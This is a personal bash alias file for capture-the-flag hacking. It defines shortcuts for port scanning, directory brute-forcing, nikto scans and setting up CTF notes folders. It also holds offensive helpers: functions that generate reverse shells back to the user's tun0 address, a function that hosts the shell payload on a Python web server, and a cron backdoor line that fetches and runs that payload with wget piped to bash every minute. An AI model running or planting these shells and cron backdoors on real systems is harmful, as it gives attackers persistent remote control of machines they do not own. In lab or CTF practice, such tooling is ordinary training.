#!/bin/bash

# this file contains extra aliases that i used when playing capture the flag (ctf)

ctf_interface="tun0"

# rustscan
rs() {
  if [[ "$1" != "" ]]; then
    tip="$1"
  fi
  rustscan -b 2000 --ulimit 5000 -a "$tip" -- -A | tee rustscan.log
}

# extract ipv4 address from string
grip() {
  grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
}

# get ip address of interface specified above
getip() {
  ip a s $ctf_interface | grip
}

# copy ip address of ctf interface to clipboard
cpip() {
  getip | setclip
}

# create folder with typical ctf structure
# usage: newctf [name] [target_ip]
newctf() {
  target_name="$1"
  target_name_upper="$(tr '[:lower:]' '[:upper:]' <<< "${target_name:0:1}")${target_name:1}"
  tip="$2"
  my_ip="$(getip)"

  mkdir "$target_name" && cd "$target_name" || exit 1
  echo "# $target_name_upper\n\nMy IP:         $my_ip\nTarget IP:     $tip\n\n" > notes.md
  echo "$tip" > target_ip
  code .
}

# set target ip address to first parameter
sett() {
  tip="$1"
  echo "$tip" > target_ip
}

# copy current target ip address to clipboard
gett() {
  echo "$tip"
  echo "$tip" | setclip
}

# generate reverse shell using https://github.com/Gobidev/Print-My-Shell
# usage: genrev [type] [port]
genrev() {
  if [[ "$2" != "" ]]; then
    rev_port="$2"
  else
    rev_port="9999"
  fi
  pms -i "$(getip)" -p $rev_port -s -t "$1"
  unset rev_port
}

# generate reverse shell using genrev and copy result to clipboard
genrevc() {
  revshell="$(genrev "$@")"
  echo "$revshell" && echo "$revshell" | setclip
}

# generate reverse shell and host it on python http server
revpayload() {
  echo "#!/bin/sh\n$(genrev "$@")" > payload
  python -m http.server
}

# generate cron backdoor that runs payload of revpayload every minute and copy it to clipboard
bdcron() {
  echo "* * * * * /usr/bin/wget -O- http://$(getip):8000/payload | /bin/bash" | setclip
}

# aliases to simplify use of common http scan tools
alias gob="gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u"
alias ferb="feroxbuster -o feroxbuster.log -u"
alias nik="nikto -o nikto_log.txt -h"
gobt() { gob "$tip"; }
ferbt() { ferb http://"$tip"; }
nikt() { nik "$tip"; }
pnt() { ping "$tip"; }

# create tip (target_ip) variable if file is present
if test -f target_ip; then
  tip="$(cat target_ip)"
fi
